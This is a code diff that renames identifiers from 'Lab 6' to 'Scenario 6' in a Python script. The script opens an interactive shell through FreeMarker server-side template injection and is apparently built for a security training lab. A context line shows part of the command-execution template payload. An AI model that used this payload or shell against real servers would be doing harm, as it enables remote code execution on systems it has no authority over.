@@ -13,7 +13,7 @@ COLOR_CYAN = "\033[96m"
 COLOR_WHITE = "\033[97m"
 COLOR_RESET = "\033[0m"
 
-class Lab6Scenario(BaseLabScenario):
+class Scenario6(BaseLabScenario):
     """Interactive shell for SSTI in sandboxed environment"""
     
     def __init__(self, target_url, session):  # Updated signature
@@ -22,11 +22,11 @@ class Lab6Scenario(BaseLabScenario):
 
     @classmethod
     def detect(cls, response_text):
-        """Check if this is Lab 6 by identifying text"""
+        """Check if this is Scenario 6 by identifying text"""
         return "Server-side template injection in a sandboxed environment" in response_text
     
     def lab_name(self):
-        return "Server-side template injection in sandboxed environment (Lab 6)"
+        return "Server-side template injection in sandboxed environment (Scenario 6)"
 
     def execute_command(self, command):
         """Execute commands using Freemarker SSTI"""
@@ -95,7 +95,7 @@ ${{dwf.newInstance(ec,null)("{command}")}}"""
 if __name__ == "__main__":
     import argparse
     
-    parser = argparse.ArgumentParser(description="SSTI Lab 6 Interactive Shell")
+    parser = argparse.ArgumentParser(description="SSTI Scenario 6 Interactive Shell")
     parser.add_argument("url", help="Target lab URL")
     parser.add_argument("--proxy", help="Proxy server (ip:port)", default=None)
     parser.add_argument("--shell", action="store_true", help="Start interactive shell")
@@ -110,7 +110,7 @@ if __name__ == "__main__":
         session.proxies = {'http': proxy, 'https': proxy}
     
     print("\n=== Starting SSTI Shell ===")
-    exploiter = Lab6Scenario(args.url.strip(), session)
+    exploiter = Scenario6(args.url.strip(), session)
     
     if exploiter.exploit() and args.shell:
         exploiter.interactive_shell()
